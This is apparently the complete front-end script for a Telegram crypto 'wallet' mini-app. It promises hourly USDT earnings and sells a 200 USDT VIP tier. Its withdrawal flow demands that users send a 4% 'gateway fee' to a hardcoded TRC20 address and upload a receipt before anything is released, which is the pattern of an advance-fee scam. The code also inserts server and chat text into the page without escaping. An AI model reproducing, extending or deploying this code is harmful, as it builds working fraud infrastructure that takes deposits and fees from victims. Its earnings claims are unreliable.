/**
 * Wallet Masters — Frontend App
 * Professional Crypto Wallet · No emoji in UI
 */

const tg = window.Telegram.WebApp;
tg.ready();
tg.expand();

const FEE_ADDR   = 'TPwUS8v77TtcsYZUHUTvVx2TGqE37QnagZ';
const API        = window.location.origin + '/api';
const MIN_WD     = 5000;
const MAX_WD     = 50000;

let state = {
  user: null, balance: 0, trc20Address: '', uid: '',
  transactions: [], connections: [], earningApps: [],
  network: 'TRC20', withdrawType: 'crypto',
  pendingWithdrawal: null, hourlyStatus: { canClaim: false, nextClaimIn: 0, hourlyAmount: 50 },
  countdownTimer: null, balanceHidden: false, isVIP: false
};

// ── Init ──────────────────────────────────────────────────────────────────────
async function init() {
  try {
    const initData   = tg.initData || '';
    const unsafeUser = tg.initDataUnsafe?.user || null;
    const res  = await fetch(`${API}/auth`, {
      method: 'POST', headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ initData, unsafeUser })
    });
    const data = await res.json();
    if (!data.success) { showError(data.error || 'Failed to load. Open via Telegram.'); return; }

    state.user         = data.user;
    state.balance      = data.user.balance || 0;
    state.trc20Address = data.user.trc20Address;
    state.uid          = data.user.uid;
    state.transactions = data.transactions || [];
    state.connections  = data.connections  || [];
    state.hourlyStatus = data.user.hourlyStatus || state.hourlyStatus;
    state.isVIP        = data.user.isVIP === true;

    updateUI();
    loadEarningApps();
    startCountdown();

    const splash = document.getElementById('splash');
    if (splash) {
      splash.style.transition = 'opacity 0.6s';
      splash.style.opacity = '0';
      setTimeout(() => {
        splash.classList.add('hidden');
        g('app').classList.remove('hidden');
        generateQR(state.trc20Address);
      }, 600);
    }
  } catch(err) {
    console.error('Init error:', err);
    showError('Connection error. Please try again.');
  }
}

function showError(msg) {
  const splash = document.getElementById('splash');
  if (splash) splash.innerHTML = `<div class="splash-inner"><div style="font-size:40px;margin-bottom:16px">⚠</div><h2 style="color:#fff;margin-bottom:8px">Load Failed</h2><p style="color:#94a3b8;padding:0 24px;text-align:center">${msg}</p><button onclick="location.reload()" style="margin-top:24px;padding:12px 28px;background:#1d4ed8;color:#fff;border:none;border-radius:8px;font-size:14px;cursor:pointer">Retry</button></div>`;
}

function g(id) { return document.getElementById(id) || { textContent:'', innerHTML:'', classList:{add:()=>{},remove:()=>{},toggle:()=>{},contains:()=>false}, style:{} }; }

// ── UI Update ─────────────────────────────────────────────────────────────────
function updateUI() {
  const u = state.user;
  if (!u) return;
  const name = u.name || u.username || 'User';
  g('userName').textContent   = name;
  g('userUID').textContent    = `UID: ${u.uid}`;
  g('userAvatar').textContent = name[0].toUpperCase();

  // VIP badge
  if (state.isVIP) {
    g('vipBadge').classList.remove('hidden');
    g('vipPromo').classList.add('hidden');
    g('withdrawTypeRow').classList.remove('hidden');
    g('earnTitle').textContent = 'VIP Earnings Active';
    g('earnSub').textContent   = 'Earn 200 USDT every hour';
  } else {
    g('vipBadge').classList.add('hidden');
    g('vipPromo').classList.remove('hidden');
    g('withdrawTypeRow').classList.add('hidden');
    g('earnTitle').textContent = 'Hourly Earnings Active';
    g('earnSub').textContent   = 'Earn 50 USDT every hour';
  }

  const bal = state.balance.toFixed(2);
  g('balanceAmount').textContent = state.balanceHidden ? '••••••' : bal;
  g('balanceUSD').textContent    = bal;
  g('usdtBalance').textContent   = bal;
  g('usdtValue').textContent     = `$${bal}`;
  g('trc20Address').textContent  = shortAddr(state.trc20Address);
  g('receiveAddress').textContent = state.trc20Address;
  g('receiveUID').textContent    = state.uid;
  g('availBalance').textContent  = bal;

  updateClaimBtn();
  renderTx(state.transactions, false);
}

function shortAddr(a) { return a ? a.slice(0,10) + '...' + a.slice(-6) : '---'; }

// ── Balance Toggle ────────────────────────────────────────────────────────────
function toggleBalance() {
  state.balanceHidden = !state.balanceHidden;
  g('balanceAmount').textContent = state.balanceHidden ? '••••••' : state.balance.toFixed(2);
}

// ── Hourly Claim ──────────────────────────────────────────────────────────────
function updateClaimBtn() {
  const btn = g('claimHourlyBtn');
  const s   = state.hourlyStatus;
  if (s.canClaim) {
    btn.textContent = `Claim ${s.hourlyAmount} USDT`;
    btn.disabled    = false;
    btn.style.opacity = '1';
  } else {
    const m = Math.floor(s.nextClaimIn / 60), sc = s.nextClaimIn % 60;
    btn.textContent = `${m}m ${sc}s`;
    btn.disabled    = true;
    btn.style.opacity = '0.55';
  }
}

function startCountdown() {
  if (state.countdownTimer) clearInterval(state.countdownTimer);
  state.countdownTimer = setInterval(() => {
    if (state.hourlyStatus.nextClaimIn > 0) state.hourlyStatus.nextClaimIn--;
    if (state.hourlyStatus.nextClaimIn <= 0) state.hourlyStatus.canClaim = true;
    updateClaimBtn();
  }, 1000);
}

async function claimHourly() {
  if (!state.hourlyStatus.canClaim) return;
  const btn = g('claimHourlyBtn');
  btn.textContent = 'Processing...'; btn.disabled = true;
  try {
    const r = await post('/claim-hourly', {});
    if (r.success) {
      state.balance = r.newBalance;
      state.hourlyStatus = { canClaim: false, nextClaimIn: 3600, hourlyAmount: r.amount };
      state.transactions.unshift({ type: 'earning', amount: r.amount, currency: 'USDT', status: 'completed', source_app: r.isVIP ? 'VIP Bonus' : 'Hourly Bonus', created_at: Math.floor(Date.now()/1000) });
      updateUI(); startCountdown();
      toast(`+${r.amount} USDT Claimed`);
      tg.HapticFeedback?.notificationOccurred('success');
    } else {
      toast(r.error || 'Not ready yet');
      const st = await post('/hourly-status', {});
      state.hourlyStatus = st; updateClaimBtn(); startCountdown();
    }
  } catch(e) { toast('Network error'); updateClaimBtn(); }
}

// ── VIP ───────────────────────────────────────────────────────────────────────
function showVIPUpgrade() {
  const box = document.createElement('div');
  box.className = 'modal-wrap';
  box.id = 'vipModal';
  box.innerHTML = `
    <div class="modal">
      <div class="modal-hdr"><h3>VIP Membership</h3><button class="modal-close" onclick="document.getElementById('vipModal').remove()">✕</button></div>
      <div class="vip-modal-body">
        <div class="vip-benefit-list">
          <div class="vip-benefit"><span class="vb-check">✓</span><span>Earn 200 USDT every hour (4x standard)</span></div>
          <div class="vip-benefit"><span class="vb-check">✓</span><span>Bank & payment method withdrawals</span></div>
          <div class="vip-benefit"><span class="vb-check">✓</span><span>Priority support access</span></div>
          <div class="vip-benefit"><span class="vb-check">✓</span><span>VIP member badge</span></div>
        </div>
        <div class="vip-requirement">Deposit 200 USDT to your wallet address to activate VIP</div>
        <div class="vip-addr-box">
          <div class="va-label">Deposit Address (TRC20)</div>
          <div class="va-addr">${state.trc20Address}</div>
          <button class="btn-outline w100" onclick="copyText('${state.trc20Address}'); toast('Address copied')">Copy Address</button>
        </div>
        <button class="btn-primary w100 mt12" onclick="checkVIPStatus()">Check Upgrade Status</button>
      </div>
    </div>`;
  document.body.appendChild(box);
}

async function checkVIPStatus() {
  toast('Checking VIP status...');
  try {
    const r = await post('/check-vip', {});
    if (r.isVIP) {
      state.isVIP = true;
      state.hourlyStatus.hourlyAmount = 200;
      updateUI();
      toast('VIP Activated!');
      const m = document.getElementById('vipModal');
      if (m) m.remove();
    } else {
      toast(`Need ${r.needed?.toFixed(2) || 200} more USDT to unlock VIP`);
    }
  } catch(e) { toast('Error checking status'); }
}

// ── Page Navigation ───────────────────────────────────────────────────────────
function showPage(name) {
  document.querySelectorAll('.page').forEach(p => p.classList.remove('active'));
  document.querySelectorAll('.nav-btn').forEach(b => b.classList.toggle('active', b.dataset.page === name));
  const page = g(`page-${name}`);
  if (page) {
    page.classList.add('active');
    if (name === 'receive')  generateQR(state.trc20Address);
    if (name === 'connect')  renderConnect();
    if (name === 'activity') renderTx(state.transactions, true);
    if (name === 'support')  loadSupportMessages();
    if (name === 'withdraw') { resetWithdrawForm(); }
  }
}

// ── Transactions ──────────────────────────────────────────────────────────────
function renderTx(txs, all) {
  const make = (list, lim) => {
    if (!list?.length) return '<div class="empty-tx">No transactions yet</div>';
    return (lim ? list : list.slice(0, 5)).map(txHTML).join('');
  };
  const homeList = g('txList'), allList = g('allTxList');
  homeList.innerHTML = make(txs, false);
  allList.innerHTML  = make(txs, true);
}

function txHTML(tx) {
  const isIn  = ['deposit','earning'].includes(tx.type);
  const sign  = isIn ? '+' : '-';
  const dt    = new Date((tx.created_at||0)*1000);
  const date  = dt.toLocaleDateString('en-US', { month:'short', day:'numeric' });
  const time  = dt.toLocaleTimeString('en-US', { hour:'2-digit', minute:'2-digit' });
  const src   = tx.source_app ? `<div class="tx-src">${tx.source_app}</div>` : '';
  const statusClass = { completed:'st-done', approved:'st-done', rejected:'st-rejected', awaiting_fee:'st-pending', fee_paid:'st-review', pending:'st-pending', earning:'st-done' }[tx.status] || 'st-pending';
  const statusLabel = { completed:'Completed', approved:'Approved', rejected:'Rejected', awaiting_fee:'Awaiting Fee', fee_paid:'In Review', pending:'Pending', earning:'Completed' }[tx.status] || tx.status;
  const typeLabel = { deposit:'Deposit', withdrawal:'Withdrawal', earning:tx.source_app||'Earnings' }[tx.type] || tx.type;
  return `<div class="tx-row" onclick="viewTxDetail(${tx.id})">
    <div class="tx-ico ${isIn?'tx-in':'tx-out'}">
      ${isIn
        ? '<svg width="14" height="14" fill="none" stroke="currentColor" stroke-width="2.5" viewBox="0 0 24 24"><line x1="12" y1="5" x2="12" y2="19"/><polyline points="19 12 12 19 5 12"/></svg>'
        : '<svg width="14" height="14" fill="none" stroke="currentColor" stroke-width="2.5" viewBox="0 0 24 24"><line x1="12" y1="19" x2="12" y2="5"/><polyline points="5 12 12 5 19 12"/></svg>'
      }
    </div>
    <div class="tx-info">
      <div class="tx-type">${typeLabel}</div>
      ${src}
      <div class="tx-date">${date} · ${time}</div>
    </div>
    <div class="tx-right">
      <div class="tx-amt ${isIn?'amt-in':'amt-out'}">${sign}${Number(tx.amount).toFixed(2)} ${tx.currency||'USDT'}</div>
      <div class="tx-status ${statusClass}">${statusLabel}</div>
    </div>
  </div>`;
}

function viewTxDetail(txId) {
  const tx = state.transactions.find(t => t.id === txId);
  if (!tx) return;
  const isIn  = ['deposit','earning'].includes(tx.type);
  const sign  = isIn ? '+' : '-';
  const dt    = new Date((tx.created_at||0)*1000).toLocaleString();
  const statusLabel = { completed:'Completed', approved:'Approved', rejected:'Rejected', awaiting_fee:'Awaiting Fee', fee_paid:'In Review', pending:'Pending', earning:'Completed' }[tx.status] || tx.status;
  const statusClass = { completed:'st-done', approved:'st-done', rejected:'st-rejected', awaiting_fee:'st-pending', fee_paid:'st-review', pending:'st-pending', earning:'st-done' }[tx.status] || 'st-pending';

  g('txDetailContent').innerHTML = `
    <div class="tx-detail-card">
      <div class="tdc-top">
        <div class="tdc-ico ${isIn?'tx-in':'tx-out'}">
          ${isIn
            ? '<svg width="20" height="20" fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24"><line x1="12" y1="5" x2="12" y2="19"/><polyline points="19 12 12 19 5 12"/></svg>'
            : '<svg width="20" height="20" fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24"><line x1="12" y1="19" x2="12" y2="5"/><polyline points="5 12 12 5 19 12"/></svg>'
          }
        </div>
        <div class="tdc-amt ${isIn?'amt-in':'amt-out'}">${sign}${Number(tx.amount).toFixed(2)} ${tx.currency||'USDT'}</div>
        <div class="tdc-status ${statusClass}">${statusLabel}</div>
      </div>
      <div class="tdc-rows">
        <div class="tdc-row"><span class="tdc-lbl">Type</span><span class="tdc-val">${tx.type.charAt(0).toUpperCase()+tx.type.slice(1)}</span></div>
        <div class="tdc-row"><span class="tdc-lbl">Date</span><span class="tdc-val">${dt}</span></div>
        ${tx.tx_hash ? `<div class="tdc-row"><span class="tdc-lbl">TX Hash</span><span class="tdc-val tdc-mono">${tx.tx_hash.slice(0,20)}...</span></div>` : ''}
        ${tx.to_address ? `<div class="tdc-row"><span class="tdc-lbl">To Address</span><span class="tdc-val tdc-mono">${tx.to_address.slice(0,16)}...</span></div>` : ''}
        ${tx.from_address ? `<div class="tdc-row"><span class="tdc-lbl">From</span><span class="tdc-val tdc-mono">${tx.from_address.slice(0,16)}...</span></div>` : ''}
        ${tx.source_app ? `<div class="tdc-row"><span class="tdc-lbl">Source</span><span class="tdc-val">${tx.source_app}</span></div>` : ''}
        <div class="tdc-row"><span class="tdc-lbl">Network</span><span class="tdc-val">${tx.network||'TRC20'}</span></div>
        ${tx.gateway_fee ? `<div class="tdc-row"><span class="tdc-lbl">Gateway Fee</span><span class="tdc-val">${tx.gateway_fee} USDT</span></div>` : ''}
        ${tx.bank_name ? `<div class="tdc-row"><span class="tdc-lbl">Bank</span><span class="tdc-val">${tx.bank_name}</span></div>` : ''}
        ${tx.account_number ? `<div class="tdc-row"><span class="tdc-lbl">Account No.</span><span class="tdc-val">${tx.account_number}</span></div>` : ''}
        ${tx.account_name ? `<div class="tdc-row"><span class="tdc-lbl">Account Name</span><span class="tdc-val">${tx.account_name}</span></div>` : ''}
        <div class="tdc-row"><span class="tdc-lbl">Transaction ID</span><span class="tdc-val">#${tx.id}</span></div>
      </div>
      <button class="btn-outline w100 mt12" onclick="showPage('activity')">Back to History</button>
    </div>`;
  showPage('tx-detail');
}

// ── Withdrawal ────────────────────────────────────────────────────────────────
function setWithdrawType(type) {
  state.withdrawType = type;
  g('btnCrypto').classList.toggle('active', type === 'crypto');
  g('btnBank').classList.toggle('active', type === 'bank');
  g('cryptoFields').classList.toggle('hidden', type === 'bank');
  g('bankFields').classList.toggle('hidden', type === 'crypto');
  onWithdrawInput();
}

function selectNetwork(el) {
  document.querySelectorAll('.net-opt').forEach(o => o.classList.remove('active'));
  el.classList.add('active');
  state.network = el.dataset.n;
}

function resetWithdrawForm() {
  const fields = ['withdrawAddress','withdrawAmount','bankAccount','bankName'];
  fields.forEach(f => { const el = g(f); if (el) el.value = ''; });
  const pm = g('paymentMethod'); if (pm) pm.value = '';
  updateFees();
  setWithdrawType(state.isVIP ? state.withdrawType : 'crypto');
}

function onWithdrawInput() { updateFees(); validateWithdraw(); }
function onBankMethodChange() { onWithdrawInput(); }

function validateWithdraw() {
  const amt    = parseFloat(g('withdrawAmount').value) || 0;
  const btn    = g('withdrawBtn');
  let valid    = amt >= MIN_WD && amt <= MAX_WD && amt <= state.balance;
  if (state.withdrawType === 'crypto') {
    const addr = (g('withdrawAddress').value || '').trim();
    valid = valid && addr.length >= 20;
    g('addrWarn').classList.toggle('hidden', !addr || addr.length >= 20);
  } else {
    const acct  = (g('bankAccount').value  || '').trim();
    const bname = (g('bankName').value     || '').trim();
    const pm    = (g('paymentMethod').value || '').trim();
    valid = valid && acct.length > 3 && bname.length > 2 && pm.length > 0;
  }
  btn.disabled = !valid;
}

function updateFees() {
  const amt = parseFloat(g('withdrawAmount').value) || 0;
  const gf  = parseFloat((amt * 0.04).toFixed(2));
  g('feeAmt').textContent           = `${amt.toFixed(2)} USDT`;
  g('gatewayFeeDisplay').textContent = `${gf.toFixed(2)} USDT`;
  g('totalFeeDisplay').textContent   = `${gf.toFixed(2)} USDT`;
  validateWithdraw();
}

function setPct(pct) {
  const inp = g('withdrawAmount');
  inp.value = (state.balance * pct / 100).toFixed(2);
  updateFees();
}

async function submitWithdrawal() {
  const amt   = parseFloat(g('withdrawAmount').value);
  const btn   = g('withdrawBtn');
  const isBankWD = state.withdrawType === 'bank';
  const payload  = {
    amount: amt, currency: 'USDT', network: state.network,
    isBankWithdrawal: isBankWD,
    toAddress:     isBankWD ? '' : (g('withdrawAddress').value||'').trim(),
    bankName:      isBankWD ? (g('paymentMethod').value||'') : null,
    accountNumber: isBankWD ? (g('bankAccount').value||'').trim() : null,
    accountName:   isBankWD ? (g('bankName').value||'').trim()    : null,
    paymentMethod: isBankWD ? (g('paymentMethod').value||'')      : null
  };
  btn.textContent = 'Processing...'; btn.disabled = true;
  try {
    const r = await post('/withdraw', payload);
    btn.textContent = 'Continue to Payment'; btn.disabled = false;
    if (!r.success) return toast('Error: ' + (r.error || 'Unknown'));
    state.pendingWithdrawal = r.withdrawal;
    showFeePayPage(r.withdrawal, isBankWD, payload);
  } catch(e) {
    toast('Network error'); btn.textContent = 'Continue to Payment'; btn.disabled = false;
  }
}

function showFeePayPage(wd, isBankWD, payload) {
  const dest = isBankWD
    ? `${payload.bankName} · ${payload.accountNumber} · ${payload.accountName}`
    : wd.toAddress;
  const refId = 'WM-' + Date.now().toString(36).toUpperCase();

  g('feePayBox').innerHTML = `
    <div class="fee-pay-card">
      <div class="fpc-header">
        <div class="fpc-icon">
          <svg width="28" height="28" fill="none" stroke="currentColor" stroke-width="1.5" viewBox="0 0 24 24"><path d="M12 20V4m-8 8l8-8 8 8"/></svg>
        </div>
        <h3>Pay Gateway Fee</h3>
        <p>Complete payment to process your withdrawal</p>
      </div>
      <div class="fpc-details">
        <div class="fpc-row"><span>Reference ID</span><span class="fpc-ref">${refId}</span></div>
        <div class="fpc-row"><span>Amount</span><span>${Number(wd.amount).toFixed(2)} USDT</span></div>
        <div class="fpc-row"><span>Destination</span><span class="fpc-dest">${dest}</span></div>
        <div class="fpc-row"><span>Network</span><span>${wd.network||'TRC20'}</span></div>
        ${isBankWD ? `<div class="fpc-row"><span>Payment Method</span><span>${payload.bankName}</span></div>` : ''}
        <div class="fpc-row fpc-fee"><span>Gateway Fee (4%)</span><span class="fpc-fee-val">${Number(wd.gatewayFee||wd.totalFee).toFixed(2)} USDT</span></div>
      </div>
      <div class="fpc-pay-section">
        <div class="fpc-pay-label">Send gateway fee to this TRC20 address:</div>
        <div class="fpc-pay-addr-box">
          <span class="fpc-pay-addr">${FEE_ADDR}</span>
          <button class="copy-mini-btn" onclick="copyText('${FEE_ADDR}'); toast('Fee address copied')">Copy</button>
        </div>
        <div class="fpc-pay-note">Send exactly <strong>${Number(wd.gatewayFee||wd.totalFee).toFixed(2)} USDT</strong> on TRC20 network only</div>
      </div>
      <div class="fpc-upload-section">
        <div class="fpc-upload-label">Upload Payment Receipt</div>
        <label class="upload-drop" for="receiptFile" id="uploadDrop">
          <svg width="28" height="28" fill="none" stroke="currentColor" stroke-width="1.5" viewBox="0 0 24 24"><path d="M21 15v4a2 2 0 01-2 2H5a2 2 0 01-2-2v-4"/><polyline points="17 8 12 3 7 8"/><line x1="12" y1="3" x2="12" y2="15"/></svg>
          <span id="uploadLabel">Tap to upload screenshot</span>
          <input type="file" id="receiptFile" accept="image/*" onchange="previewReceipt(this)" style="display:none"/>
        </label>
        <img id="receiptPreview" style="display:none;width:100%;border-radius:8px;margin-top:10px;max-height:220px;object-fit:contain"/>
      </div>
      <button class="btn-primary w100" id="submitReceiptBtn" onclick="submitReceipt(${wd.id})" disabled>Submit Receipt for Review</button>
      <button class="btn-outline w100 mt12" onclick="showPage('withdraw')">Back</button>
    </div>`;
  showPage('fee-pay');
}

function previewReceipt(input) {
  const file = input.files[0]; if (!file) return;
  const r = new FileReader();
  r.onload = e => {
    const img = g('receiptPreview');
    img.src = e.target.result; img.style.display = 'block';
    g('uploadDrop').style.borderColor = '#22c55e';
    g('uploadLabel').textContent = file.name;
    g('submitReceiptBtn').disabled = false;
  };
  r.readAsDataURL(file);
}

async function submitReceipt(wrId) {
  const fi  = g('receiptFile');
  const btn = g('submitReceiptBtn');
  if (!fi?.files[0]) return toast('Please upload a receipt first');
  btn.textContent = 'Submitting...'; btn.disabled = true;
  const r = new FileReader();
  r.onload = async e => {
    const res = await post('/receipt', { withdrawalId: wrId, receiptBase64: e.target.result });
    if (res.success) {
      toast('Receipt submitted. Awaiting review.');
      tg.HapticFeedback?.notificationOccurred('success');
      g('feePayBox').innerHTML = `<div style="text-align:center;padding:48px 20px"><div class="success-check">✓</div><h3 style="color:#22c55e;margin:16px 0 8px">Receipt Submitted</h3><p style="color:#94a3b8">Your withdrawal is under review. You will be notified once approved.</p><button class="btn-primary mt12" style="width:100%" onclick="showPage('home')">Back to Home</button></div>`;
      state.pendingWithdrawal = null;
    } else {
      toast('Error: ' + (res.error || 'Submission failed'));
      btn.textContent = 'Submit Receipt for Review'; btn.disabled = false;
    }
  };
  r.readAsDataURL(fi.files[0]);
}

// ── QR Code ───────────────────────────────────────────────────────────────────
function generateQR(text) {
  const c = g('qrCanvas'); if (!c || !text) return;
  c.innerHTML = '';
  try { new QRCode(c, { text, width:200, height:200, colorDark:'#000', colorLight:'#fff', correctLevel: QRCode.CorrectLevel.M }); }
  catch(e) { c.innerHTML = `<div style="padding:16px;word-break:break-all;font-size:10px">${text}</div>`; }
}

// ── Connect Page ──────────────────────────────────────────────────────────────
function renderConnect() {
  const grid = g('appsGrid');
  if (!state.earningApps.length) { grid.innerHTML = '<div class="empty-tx">No apps available yet</div>'; return; }
  grid.innerHTML = state.earningApps.map(app => `
    <div class="app-card" onclick="openModal(${app.id},'${app.name.replace(/'/g,"\\'")}')">
      <div class="app-logo">${app.name[0].toUpperCase()}</div>
      <div class="app-info">
        <div class="app-name">${app.name}</div>
        <div class="app-desc">${app.description || 'Earning App'}</div>
      </div>
      <div class="app-status ${isConnected(app.id) ? 'connected' : ''}">${isConnected(app.id) ? 'Connected' : 'Connect'}</div>
    </div>`).join('');
}
function isConnected(appId) { return state.connections.some(c => c.app_id === appId); }
async function loadEarningApps() {
  try { const r = await fetch(`${API}/apps`); state.earningApps = await r.json(); }
  catch(e) {}
}

let _connectAppId = null;
function openModal(appId, appName) {
  _connectAppId = appId;
  g('modalTitle').textContent = `Connect to ${appName}`;
  g('modalUID').value = '';
  g('uidErr').classList.add('hidden');
  g('connectModal').classList.remove('hidden');
  setTimeout(() => g('modalUID').focus(), 100);
}
function closeModal() { g('connectModal').classList.add('hidden'); _connectAppId = null; }

async function submitUID() {
  const uid  = (g('modalUID').value || '').trim();
  const err  = g('uidErr');
  const btn  = g('connectBtn');
  if (!uid)           { err.textContent = 'Please enter your UID'; err.classList.remove('hidden'); return; }
  if (uid.length < 3) { err.textContent = 'Invalid UID — too short'; err.classList.remove('hidden'); return; }
  err.classList.add('hidden');
  btn.textContent = 'Connecting...'; btn.disabled = true;
  const r = await fetch(`${API}/connect-uid`, {
    method: 'POST', headers:{'Content-Type':'application/json'},
    body: JSON.stringify({ telegram_id: state.user?.telegramId, app_id: _connectAppId, external_uid: uid })
  }).then(r=>r.json());
  btn.textContent = 'Connect Wallet'; btn.disabled = false;
  if (r.success) {
    toast('UID Connected'); closeModal();
    const ar = await post('/auth', {});
    if (ar.success) { state.connections = ar.connections || []; renderConnect(); }
  } else {
    err.textContent = 'Invalid UID. Check and try again.'; err.classList.remove('hidden');
  }
}

// ── Support ───────────────────────────────────────────────────────────────────
async function loadSupportMessages() {
  try {
    const r = await post('/support/messages', {});
    if (r.success) renderSupportMessages(r.messages);
  } catch(e) {}
}

function renderSupportMessages(msgs) {
  const box = g('supportMessages');
  if (!msgs?.length) { box.innerHTML = '<div class="support-welcome"><div class="sw-icon"><svg width="32" height="32" fill="none" stroke="currentColor" stroke-width="1.5" viewBox="0 0 24 24"><path d="M21 15a2 2 0 01-2 2H7l-4 4V5a2 2 0 012-2h14a2 2 0 012 2z"/></svg></div><p>Send a message to our Support Team. We typically reply within a few hours.</p></div>'; return; }
  box.innerHTML = msgs.map(m => {
    const isAdmin = m.sender === 'admin';
    const dt = new Date((m.created_at||0)*1000).toLocaleTimeString('en-US',{hour:'2-digit',minute:'2-digit'});
    return `<div class="msg-row ${isAdmin ? 'msg-admin' : 'msg-user'}">
      ${isAdmin ? '<div class="msg-sender">Support Team</div>' : ''}
      <div class="msg-bubble">${m.message}</div>
      <div class="msg-time">${dt}</div>
    </div>`;
  }).join('');
  box.scrollTop = box.scrollHeight;
}

async function sendSupportMsg() {
  const input = g('supportInput');
  const msg   = (input.value || '').trim();
  if (!msg) return;
  input.value = '';
  try {
    const r = await post('/support/send', { message: msg });
    if (r.success) {
      await loadSupportMessages();
    } else { toast(r.error || 'Failed to send'); input.value = msg; }
  } catch(e) { toast('Network error'); input.value = msg; }
}

// ── Helpers ───────────────────────────────────────────────────────────────────
async function post(endpoint, extra) {
  const initData   = tg.initData || '';
  const unsafeUser = tg.initDataUnsafe?.user || null;
  const res = await fetch(`${API}${endpoint}`, {
    method: 'POST', headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({ initData, unsafeUser, ...extra })
  });
  return res.json();
}

function copyAddress() { copyText(state.trc20Address); toast('Address copied'); }
function copyUID()     { copyText(state.uid);           toast('UID copied'); }

function copyText(text) {
  if (navigator.clipboard) navigator.clipboard.writeText(text).catch(()=>{});
  else { const t = document.createElement('textarea'); t.value = text; document.body.appendChild(t); t.select(); document.execCommand('copy'); document.body.removeChild(t); }
}

let _toastTimer;
function toast(msg) {
  let t = g('_toast');
  if (!t.textContent && !t.style.position) {
    t = document.createElement('div'); t.id = '_toast';
    t.style.cssText = 'position:fixed;bottom:80px;left:50%;transform:translateX(-50%);background:rgba(15,20,40,0.95);color:#fff;padding:10px 20px;border-radius:8px;font-size:13px;z-index:9999;pointer-events:none;max-width:80vw;text-align:center;transition:opacity .3s;border:1px solid rgba(255,255,255,.1)';
    document.body.appendChild(t);
  }
  t.textContent = msg; t.style.opacity = '1';
  if (_toastTimer) clearTimeout(_toastTimer);
  _toastTimer = setTimeout(() => { t.style.opacity = '0'; }, 2800);
}

window.addEventListener('DOMContentLoaded', init);
